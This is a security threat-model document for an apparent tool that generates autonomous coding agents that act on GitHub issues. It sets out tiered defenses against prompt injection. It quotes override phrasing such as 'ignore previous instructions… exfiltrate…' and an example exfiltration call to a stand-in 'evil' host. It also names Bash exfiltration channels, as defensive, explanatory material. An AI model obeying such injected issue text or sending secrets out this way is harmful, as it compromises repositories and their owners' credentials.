# Security model

`claude-routines` generates autonomous Claude Code agents that run on a cron,
read **open GitHub issues**, and act with `Bash`, `gh` auth, and `git push`.
That is structurally the same hazard as a GitHub Actions `pull_request_target`
workflow holding a write-scoped `GITHUB_TOKEN`: **untrusted, attacker-influenced
input flowing into a privileged executor.**

Treat every issue title, body, label, comment, commit message, and branch name
as untrusted data — never as instructions to the agent. This document is the
threat model and the defense-in-depth design. It maps to the
[GitHub Actions Security Checklist](https://corgea.com/learn/github-actions-security-checklist);
the parallels are exact even though this repo has no Actions workflows.

## Enforcement tiers

A control is only worth what it can enforce **against a prompt-injected agent**.
Every control here is one of three tiers:

| Tier | Where it lives | Survives prompt injection? |
|---|---|---|
| **1 — Build-time enforced** | `build_bodies.py`: `allowed_tools`, `outcomes.branches`, environment scoping | **Yes** — the agent cannot widen these at runtime |
| **2 — Target-repo enforced** | Branch protection, required reviews, secret scanning, CODEOWNERS — set by *you* on each target repo | **Yes** — enforced by GitHub, not the agent |
| **3 — Prompt advisory** | Everything in `<repo_invariants>` / `<untrusted_input>` | **No** — guardrails for a well-behaved agent; an injected agent can ignore them |

The design principle: **push every control as far up the tiers as possible.**
Tier-3 rules are necessary (they shape normal behavior) but never sufficient.

## Threat model

Primary adversary: anyone who can open or comment on an issue in a target repo.
For a public repo, that is the entire internet. The injection payload is issue
text crafted to redirect the agent ("ignore previous instructions… run…
exfiltrate… push to main… commit this file…").

Primary asset at risk: the target repo's source (supply-chain compromise via a
malicious PR), the `gh` credentials, and anything readable from the runner.

## Controls (mapped to the checklist)

### 1. Untrusted input is data, not instructions — checklist §3, §4

`gen_routines.py` injects a top-priority `<untrusted_input>` section into both
templates. It states the data/instruction boundary explicitly, enumerates
common injection shapes, and asserts that a trusted issue's Acceptance section
is a contract for *what* to build — never authority to override security rules,
`<repo_invariants>`, or tool/branch limits. **Tier 3** (necessary, not
sufficient — the tiers below are the real containment).

### 2. Author-trust gate — checklist §3 (untrusted execution)

Operator decision: **only owner & collaborator issues are in scope.** Before any
triage or selection, the routine runs
`gh api --paginate repos/<slug>/collaborators --jq '.[].login'`, builds a
lowercased `TRUSTED` set, and **excludes every issue whose author is not in it**
— not triaged, not selected, not read as a contract, body never allowed to
influence any other action. If the collaborator call fails, the routine
processes **zero** issues (fail-closed, never fail-open). `author` was added to
the `gh issue list --json` field set so the gate has the data it needs.
**Tier 3 behavior, but it collapses the injection surface from "the internet"
to "accounts with repo write access."** Pair with Tier-2 branch protection so a
compromised collaborator account still can't merge unreviewed.

Residual risk: a trusted author (or a compromised collaborator account) can
still write an issue whose Acceptance asks for scope expansion or network
calls. The subagent brief and `<untrusted_input>` explicitly state Acceptance
authorizes *what to build*, never tool/scope/network expansion, and instruct
the agent to flag such issues as suspected injection rather than comply — but
this is Tier 3. Tier-2 review (control §5 + required reviewers) is the
backstop.

**Defense in depth — event-trigger `Author is_one_of [...]` filter.** The
event-driven shim (see README "Adopt") configures the `issues.opened` trigger
with an Author allowlist so non-trusted issues never start a session. This
filter and the prompt-level gate above **compose**; both must allow the
issue. The filter alone is **not sufficient** — a compromised collaborator
account, a misconfigured filter, or a platform-side filter bug would
otherwise bypass containment, and the prompt-level gate is what catches it.
Operators must configure both layers on every routine.

### 3. Least-privilege tool allowlist — checklist §6, §8

`build_bodies.py` sets `allowed_tools` to
`["Bash","Read","Write","Edit","Glob","Grep"]`. `WebFetch` and `WebSearch` were
**removed**: issue triage never needs them and they are the cleanest
exfiltration / SSRF channel an injected instruction could use
(`fetch https://evil/?d=<secret>`). **Tier 1 — a prompt-injected issue cannot
add them back.**

Residual risk: `Bash` is irreducible (gh, git, test commands need it) and is a
general-purpose exfiltration channel (`curl`, `gh api`, DNS). This is the
analog of the checklist's "restrict runner network egress" item and is **not**
mitigated at Tier 1 here. Mitigate at the runner/environment layer (egress
restrictions, ephemeral runners) and at Tier 2 (small `gh` token scope). Treat
the routine's credentials as compromisable and scope them accordingly.

### 4. Branch-scope containment — checklist §2, §9

`outcomes.branches` is namespaced to `claude/<prefix>-*` per routine (was
`claude/<prefix>-routine`, which never matched the `claude/issue-N-*` branches
the prompts actually create — the old allowlist was inert). The prompts now
instruct branch names `claude/<prefix>-issue-N-<slug>` so real behavior stays
inside the allowlist, and the routine structurally cannot push to the base
branch or another routine's branches. **Tier 1.**

> **ASSUMPTION to verify per environment:** that the platform treats
> `outcomes.branches` as a prefix/glob allowlist. Confirm against
> `RemoteTrigger action=list` for your environment. If it requires exact
> branch names, this still needed to change — the previous value was already
> broken for the per-issue branches the prompts create.

### 5. Merge-gate separation: implementer never merges its own PR — checklist §3

The implementer routine (skill: `implement-from-issue`) **never enables
auto-merge** and **never merges its own PR**. This invariant is unchanged
since the original "no auto-merge" stance and is still the cornerstone of
the design — a single compromised implementer session must not be able to
both write code and land it.

What changed: autonomous merge is now possible via a **separate** routine
running the `merge-pr-with-gate` skill on a `pull_request.opened` trigger.
Two routines, two skills, two triggers. The merger has its own author-trust
gate, its own `<untrusted_input>` preamble, and its own six-condition
fail-closed gate (see §8). Splitting authoring from merging means an
injected implementer session cannot mint its own merge — it would have to
also subvert the merger session, which sees a *different* trust-allowlisted
event payload and re-runs the gate against the PR + linked issue
independently.

Note: the platform's `autofix_on_pr_create` flag (true for the implementer)
only lets the implementer fix *its own* PR's CI — it does not bypass review
and is retained intentionally. **Tier 3 in the prompt; Tier 2 with branch
protection on the base branch is what actually enforces it (§Required
operator setup).**

### 6. Secret / spec / deploy rules — checklist §4, §6

`secret_globs`, `spec_files`, `banned_deploys` are **prompt strings only
(Tier 3)** — an injected agent ignores them. The real mitigations are Tier 2:
secret-scanning pre-commit hooks and push protection on the target repo, and
CODEOWNERS on spec files. Do not rely on the prompt text alone.

### 7. Generator code execution — checklist §5

`configs.load()` does `import local_configs`, which executes arbitrary Python at
generation time. **Accepted**: `local_configs.py` is operator-authored and
gitignored; treat it like any module you write. Do not run `gen_routines.py`
against a `local_configs.py` you did not author.

### 8. Auto-merge gate (opt-in, separate routine) — checklist §3

`merge-pr-with-gate` is the opt-in v0 reversal of the original "no auto-merge"
stance, tracked in repo [#7](https://github.com/schmug/claude-routines/issues/7).
Deploy it as a **second** RemoteTrigger on `pull_request.opened` (not on the
implementer trigger). The skill enforces six conditions, all fail-closed —
the verdict is PASS only if every condition positively holds; any failure
escalates to one `needs-you` comment and exit:

1. **Provenance (primary, unforgeable):** the PR author AND the linked
   issue's author are both on the trusted-author allowlist. Re-checked
   inside the merger session — the merger does not infer trust from the
   implementer having run.
   **Opt-in strict extension (`require-spec-approved: true` in shim):**
   the linked issue must also carry the `spec-approved` label. Off by
   default. When enabled, bumps the intent-token control from "implicit
   via author-allowlist check" (Tier 3) to "human-minted GitHub label"
   (Tier 2 — label changes go through GitHub audit log; restrict label
   management with CODEOWNERS or triage-role settings to prevent the
   autonomous side from ever minting its own trust). See
   `docs/mobile-spec-ing.md` for the runbook that mints the label.
2. **Linkage:** PR body contains exactly one `Closes #N` resolving to an
   open issue meeting (1).
3. **Risk-path denylist:** no changed path matches the risk-path globs
   declared in the target repo's `CLAUDE.md` (auth/crypto, workflows, IaC,
   migrations, secret globs, MTA-STS, Cloudflare Access, etc.). The skill
   carries a conservative default if the target `CLAUDE.md` omits the list.
4. **Size envelope:** `additions + deletions ≤ 250` AND `files ≤ 8`. The
   higher-throughput-pilot defaults from `docs/proposals/auto-merge-gate/`;
   target repos can tighten in their `CLAUDE.md`.
5. **CI green:** every required check is `SUCCESS` or `NEUTRAL`. The skill
   polls `gh pr checks` for up to 20 min; pending → exits silently (next
   event will re-fire), red → fails fast.
6. **Scope-fit:** every changed path matches at least one declared pointer
   (```scope``` block or `Pointers:` section) in the linked issue. No
   declared scope = fail (no scope = not safe).

**Tier classification:**

| Layer | Where | Survives prompt injection? |
|---|---|---|
| Six-condition gate prose | `merge-pr-with-gate/SKILL.md` | **Tier 3** — guidance for a well-behaved agent |
| `Author is_one_of` filter on `pull_request.opened` | event trigger | **Tier 1** — platform-enforced |
| Branch filter `headRefName starts_with claude/` | event trigger (if available) | **Tier 1** |
| `allowed_tools` allowlist (unchanged) | build-time | **Tier 1** |
| **Branch protection on `<base>`** (required status checks, no force-push, no bypass) | target repo | **Tier 2 — the real backstop** |
| `spec-approved` label check (`require-spec-approved: true`, opt-in) | shim parameter + human-minted GitHub label | **Tier 3 (default off) → Tier 2 (when on)** — label changes go through GitHub audit log; pair with CODEOWNERS/triage-role restrictions to prevent autonomous label-minting |

**Branch protection is a prerequisite, not a recommendation.** The skill's
header asserts it; without it, a buggy or injected merger run could land
red code. Do not deploy the merger on a repo whose base branch lacks
required status checks.

**The implementer/merger split is itself a defense.** A prompt-injected
implementer session would have to *also* subvert a separate session — one
that is triggered by a different event, sees the merge-side
`<untrusted_input>` preamble, and re-runs the author-trust gate against
both the PR and the linked issue — to mint a merge. Don't collapse the
two routines into one.

**Residual risks specific to the merger:**

- The risk-path denylist is **prose, not enforced** — an injected merger
  could ignore it. Branch protection + CODEOWNERS on actually-sensitive
  paths is what stops a hostile merge there.
- CI being "green" depends on the target repo having meaningful required
  checks. A repo with no required checks fails open on §8(5). Audit the
  branch-protection ruleset before deploying. If CI is genuinely slow, the
  merger exits after the `ci-poll-budget-minutes` wall-time budget (default
  20 min, configurable per-repo in the shim) and posts one visible "CI still
  pending" PR comment listing the pending check names and the operator's next
  steps. Subsequent fires that find the comment already present exit silently
  (anti-noise discipline). Configure `pull_request.synchronize` on the merger
  trigger for slow-CI repos so a status-push re-fires the merger automatically.
- The 250-line/8-file envelope is a heuristic. A small, targeted hostile
  diff that fits the envelope and doesn't hit the denylist is the threat
  this gate explicitly does not stop — the assumption is that a trusted
  issue from a trusted author authoring such a change is acceptable risk.
  CODEOWNERS on the sensitive paths the envelope can't catch is the
  fallback.

The deterministic TypeScript gate in `docs/proposals/auto-merge-gate/`
remains the longer-term target — it converts the prose gate into a unit-
tested module the routine shells via `npx tsx`, moving correctness out of
the LLM's control loop. v0 prose ships now; the deterministic gate is the
durable upgrade.

## Required operator setup (Tier 2 — you must do this)

The generated routines are only as safe as the target repos. On **every** repo a
routine targets:

1. **Branch protection on the base branch**: require PR review, require status
   checks, disallow direct pushes. This is what actually stops a malicious or
   injected PR from landing — the prompt's "never push to base" is Tier 3.
   [`scripts/setup-branch-protection.sh`](scripts/setup-branch-protection.sh)
   audits (dry-run default) or provisions (`--apply`) this ruleset.
2. **Required reviewers / CODEOWNERS** on `spec_files` and any security-critical
   path, so the agent cannot land changes there without a human.
3. **Secret scanning + push protection** enabled (and a secret-scanning
   pre-commit hook), so `secret_globs` is enforced by GitHub, not by a prompt.
4. **Smallest possible `gh` token scope** for the routine's credential; rotate
   it; assume it is exfiltratable via `Bash`.
5. **Runner egress restrictions** if your environment supports them — the
   `Bash` residual-risk mitigation.
6. Verify the `outcomes.branches` allowlist semantics for your environment
   (see the assumption note in §4).

## Reporting

These routines are operator-deployed automation, not a hosted service. Security
issues with the generator or templates: open an issue on this repo. Issues with
a *target* repo's exposure: that is Tier-2 operator configuration — see the
required setup above.
